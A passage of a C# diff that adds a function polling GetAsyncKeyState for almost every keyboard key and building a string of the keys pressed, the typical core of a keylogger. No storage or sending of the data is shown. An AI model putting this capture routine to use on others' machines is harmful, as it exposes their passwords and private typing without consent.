+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.K))
+                returnVal += shift ? "K" : "k";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.L))
+                returnVal += shift ? "L" : "l";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.M))
+                returnVal += shift ? "M" : "m";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.N))
+                returnVal += shift ? "N" : "n";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.O))
+                returnVal += shift ? "O" : "o";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.P))
+                returnVal += shift ? "P" : "p";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Q))
+                returnVal += shift ? "Q" : "q";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.R))
+                returnVal += shift ? "R" : "r";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.S))
+                returnVal += shift ? "S" : "s";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.T))
+                returnVal += shift ? "T" : "t";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.U))
+                returnVal += shift ? "U" : "u";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.V))
+                returnVal += shift ? "V" : "v";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.W))
+                returnVal += shift ? "W" : "w";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.X))
+                returnVal += shift ? "X" : "x";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Y))
+                returnVal += shift ? "Y" : "y";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Z))
+                returnVal += shift ? "Z" : "z";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LWin))
+                returnVal += "\n[:LWin:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RWin))
+                returnVal += "\n[:RWin:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Apps))
+                returnVal += "\n[:Apps:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Sleep))
+                returnVal += "\n[:Sleep:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad0))
+                returnVal += "0";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad1))
+                returnVal += "1";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad2))
+                returnVal += "2";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad3))
+                returnVal += "3";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad4))
+                returnVal += "4";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad5))
+                returnVal += "5";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad6))
+                returnVal += "6";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad7))
+                returnVal += "7";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad8))
+                returnVal += "8";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad9))
+                returnVal += "9";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Multiply))
+                returnVal += "*";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Add))
+                returnVal += "+";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Separator))
+                returnVal += "\n[:Separator:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Subtract))
+                returnVal += "-";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Decimal))
+                returnVal += ".";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Divide))
+                returnVal += "/";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F1))
+                returnVal += "\n[:F1:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F2))
+                returnVal += "\n[:F2:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F3))
+                returnVal += "\n[:F3:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F4))
+                returnVal += "\n[:F4:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F5))
+                returnVal += "\n[:F5:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F6))
+                returnVal += "\n[:F6:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F7))
+                returnVal += "\n[:F7:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F8))
+                returnVal += "\n[:F8:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F9))
+                returnVal += "\n[:F9:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F10))
+                returnVal += "\n[:F10:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F11))
+                returnVal += "\n[:F11:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F12))
+                returnVal += "\n[:F12:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F13))
+                returnVal += "\n[:F13:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F14))
+                returnVal += "\n[:F14:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F15))
+                returnVal += "\n[:F15:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F16))
+                returnVal += "\n[:F16:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F17))
+                returnVal += "\n[:F17:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F18))
+                returnVal += "\n[:F18:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F19))
+                returnVal += "\n[:F19:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F20))
+                returnVal += "\n[:F20:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F21))
+                returnVal += "\n[:F21:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F22))
+                returnVal += "\n[:F22:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F23))
+                returnVal += "\n[:F23:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F24))
+                returnVal += "\n[:F24:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumLock))
+                returnVal += "\n[:NumLock:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Scroll))
+                returnVal += "\n[:Scroll:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LShiftKey))
+                returnVal += "";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RShiftKey))
+                returnVal += "";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LControlKey))
+                returnVal += "\n[:LControlKey:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RControlKey))
+                returnVal += "\n[:RControlKey:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LMenu))
+                returnVal += "\n[:LMenu:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RMenu))
+                returnVal += "\n[:RMenu:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserBack))
+                returnVal += "\n[:BrowserBack:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserForward))
+                returnVal += "\n[:BrowserForward:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserRefresh))
+                returnVal += "\n[:BrowserRefresh:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserStop))
+                returnVal += "\n[:BrowserStop:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserSearch))
+                returnVal += "\n[:BrowserSearch:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserFavorites))
+                returnVal += "\n[:BrowserFavorites:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserHome))
+                returnVal += "\n[:BrowserHome:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeMute))
+                returnVal += "\n[:VolumeMute:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeDown))
+                returnVal += "\n[:VolumeDown:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeUp))
+                returnVal += "\n[:VolumeUp:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaNextTrack))
+                returnVal += "\n[:MediaNextTrack:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaPreviousTrack))
+                returnVal += "\n[:MediaPreviousTrack:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaStop))
+                returnVal += "\n[:MediaStop:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaPlayPause))
+                returnVal += "\n[:MediaPlayPause:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchMail))
+                returnVal += "\n[:LaunchMail:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.SelectMedia))
+                returnVal += "\n[:SelectMedia:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchApplication1))
+                returnVal += "\n[:LaunchApplication1:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchApplication2))
+                returnVal += "\n[:LaunchApplication2:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemSemicolon))
+                returnVal += ";";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem1))
+                returnVal += "\n[:Oem1:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemplus))
+                returnVal += "\n[:Oemplus:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemcomma))
+                returnVal += "\n[:Oemcomma:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemMinus))
+                returnVal += "\n[:OemMinus:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPeriod))
+                returnVal += "\n[:OemPeriod:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuestion))
+                returnVal += "\n[:OemQuestion:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem2))
+                returnVal += "\n[:Oem2:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemtilde))
+                returnVal += "\n[:Oemtilde:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem3))
+                returnVal += "\n[:Oem3:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemOpenBrackets))
+                returnVal += "\n[:OemOpenBrackets:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem4))
+                returnVal += "\n[:Oem4:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPipe))
+                returnVal += "\\";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem5))
+                returnVal += "\n[:Oem5:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemCloseBrackets))
+                returnVal += "\n[:OemCloseBrackets:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem6))
+                returnVal += "\n[:Oem6:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuotes))
+                returnVal += "\"";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem7))
+                returnVal += "\n[:Oem7:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem8))
+                returnVal += "\n[:Oem8:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemBackslash))
+                returnVal += "\n[:OemBackslash:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem102))
+                returnVal += "\n[:Oem102:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ProcessKey))
+                returnVal += "\n[:ProcessKey:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Packet))
+                returnVal += "\n[:Packet:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Attn))
+                returnVal += "\n[:Attn:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Crsel))
+                returnVal += "\n[:Crsel:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Exsel))
+                returnVal += "\n[:Exsel:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.EraseEof))
+                returnVal += "\n[:EraseEof:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Play))
+                returnVal += "\n[:Play:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Zoom))
+                returnVal += "\n[:Zoom:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NoName))
+                returnVal += "\n[:NoName:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Pa1))
+                returnVal += "\n[:Pa1:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemClear))
+                returnVal += "\n[:OemClear:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Shift))
+                returnVal += "\n[:Shift:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Control))
+                returnVal += "\n[:Control:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Alt))
+                returnVal += "\n[:Alt:]";
+            return returnVal;
         }
 
         public void Dispose()
